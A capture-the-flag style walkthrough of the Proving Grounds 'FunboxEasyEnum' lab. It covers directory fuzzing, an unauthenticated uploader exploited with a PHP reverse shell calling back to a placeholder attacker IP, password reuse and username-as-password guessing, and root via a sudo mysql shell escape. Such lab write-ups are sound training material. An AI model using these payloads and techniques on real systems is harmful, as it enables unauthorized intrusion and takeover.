# FunboxEasyEnum - Proving Grounds Practice

> **Kill Chain Summary**: Deep Directory Fuzzing with Extensions (-x php,txt,bak) discovers hidden uploader (mini.php) -> Unrestricted PHP Reverse Shell Upload -> Foothold as www-data -> PTY Shell Stabilization -> Lateral Movement via Weak Local User Credentials (goat:goat) -> Sudo Rights over MySQL (sudo mysql -e '\! /bin/sh') -> Root Shell.

| Property | Value |
|---|---|
| **Target Name** | FunboxEasyEnum |
| **Platform** | Proving Grounds Practice |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Aggressive Directory Fuzzing (Extension Discovery), Unrestricted File Upload RCE, TTY Shell Stabilization, Default Credential Testing, GTFOBins (sudo mysql) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We start by enumerating open services:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp $IP
```

**Open Ports Summary:**

| Port | Service | Version | Initial Assessment |
|---|---|---|---|
| **22/tcp** | SSH | OpenSSH 7.6p1 | Potential remote access with valid credentials |
| **80/tcp** | HTTP | Apache httpd 2.4.29 | Web application hosting various utilities |

---

### 1.2 Web Enumeration (Port 80)

An initial basic directory scan using `common.txt` only surfaced standard directories (`/javascript`, `/phpmyadmin`).

> Note on initial attempts: The landing page contained parameter links such as `?url=`, which initially suggested potential SSRF or LFI. Extensive parameter fuzzing confirmed this was a non-functional script.

#### Aggressive Directory and Extension Fuzzing

When standard wordlists fail to uncover actionable attack surface, expanding the search using `directory-list-2.3-medium.txt` combined with explicit file extensions (`.php`, `.txt`, `.html`, `.bak`, `.old`) is essential:

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old -t 40
```

**Discovery:**
```text
/mini.php (Status: 200) [Size: 3828]
```

---

## 2. Initial Access

### 2.1 File Upload RCE via mini.php

Navigating to `http://$IP/mini.php` reveals a lightweight, unauthenticated web-based file management and upload utility.

1. Prepare a standard PHP reverse shell payload (`shell.php`):
   ```php
   <?php
   $sock=fsockopen("KALI_IP",4444);
   $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
   ?>
   ```

2. Upload `shell.php` through the web interface on `mini.php`. The uploader accepts the file without restrictions or extension filtering.

3. Start a Netcat listener on Kali:
   ```bash
   sudo nc -lvnp 4444
   ```

4. Trigger the payload by navigating directly to the uploaded file:
   ```bash
   curl http://$IP/shell.php
   ```

**Catching the Reverse Shell:**
```bash
connect to [KALI_IP] from [192.168.x.x]
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Checking user flag:
```bash
cat local.txt
[FLAG REDACTED]
```

---

### 2.2 Shell Stabilization

Because internal privilege escalation tools and commands like `su` require an interactive terminal (PTY), we upgrade the raw web shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Background shell with Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

---

## 3. Privilege Escalation

### 3.1 Internal Enumeration and Lateral Movement

Inspecting system accounts in `/etc/passwd`:

```bash
cat /etc/passwd | grep -E "sh$"
# root:x:0:0:root:/root:/bin/bash
# karla:x:1000:1000:karla,,,:/home/karla:/bin/bash
# goat:x:1001:1001:goat,,,:/home/goat:/bin/bash
```

Two interactive user accounts exist: `karla` and `goat`.

#### Attempt 1: Database Credentials
Checking database configuration files in `/etc/dbconfig-common/phpmyadmin.conf`:
```php
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
```
Testing this password against local accounts:
`su karla` with `tgbzhnujm!` succeeds. However, `karla` has no sudo rights or special group privileges.

#### Attempt 2: Weak or Identical Credential Testing (goat:goat)
A frequent vulnerability pattern in lab environments and legacy systems is password reuse where the password equals the username:

```bash
su goat
# Password: goat
goat@funbox7:~$ id
uid=1001(goat) gid=1001(goat) groups=1001(goat)
```

Authentication succeeds as `goat`.

---

### 3.2 Sudo Rights Enumeration

Checking sudo permissions for `goat`:

```bash
goat@funbox7:~$ sudo -l
Matching Defaults entries for goat on funbox7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goat may run the following commands on funbox7:
    (root) NOPASSWD: /usr/bin/mysql
```

The user `goat` is permitted to execute `/usr/bin/mysql` as root without supplying a password.

---

### 3.3 Root Escalation via GTFOBins (mysql)

Consulting GTFOBins for MySQL, the CLI client supports internal shell execution through the `\!` command escape syntax:

```bash
sudo mysql -e '\! /bin/sh'
```

**Execution and Root Verification:**
```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Aggressive directory enumeration with common web extensions
gobuster dir -u http://[TARGET_IP]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old -t 40

# PTY terminal stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Sudo MySQL GTFOBins Root Spawn
sudo mysql -e '\! /bin/sh'
```

---

## 5. Key Takeaways and Lessons Learned

1. **Extensions Make or Break Web Fuzzing:** Basic directory lists often miss standalone administrative utilities (like `mini.php`). When initial fuzzing returns few results, re-run directory bruteforce with extensions (`-x php,txt,bak,old`).
2. **Always Test username:username:** When a list of local users is obtained from `/etc/passwd`, test common authentication patterns (`user:user`, `user:password`, `admin:admin`). This can also be automated rapidly using Hydra.
3. **PTY Stabilization is Mandatory for su:** Commands like `su` explicitly reject non-interactive stdin. Shell stabilization via `pty.spawn` should be an immediate step upon landing a reverse shell.
4. **GTFOBins Verification:** Always check `sudo -l` immediately upon obtaining access to a new user account. Built-in interactive database clients (MySQL, PostgreSQL, SQLite) often feature shell escape operators.

---

### Tags
#linux #web #upload #gobuster #extensions #password-reuse #sudo #gtfobins #mysql #easy #pg-practice #rooted